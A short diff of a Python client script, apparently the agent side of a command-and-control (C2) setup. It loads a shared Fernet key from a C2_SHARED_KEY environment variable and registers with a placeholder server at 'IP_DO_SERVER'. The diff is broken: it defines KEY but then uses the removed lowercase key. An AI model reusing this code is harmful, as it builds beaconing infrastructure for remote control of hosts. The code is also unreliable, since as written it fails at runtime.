@@ -5,7 +5,10 @@ import random
 from cryptography.fernet import Fernet
 
 SERVER_URL = 'http://IP_DO_SERVER:5000'
-key = b'your_shared_key_here'  # tem de ser a mesma do server.py
+KEY = os.getenv("C2_SHARED_KEY")
+
+fernet = Fernet(key.encode())
+
 
 # Registro
 response = requests.post(f'{SERVER_URL}/register')
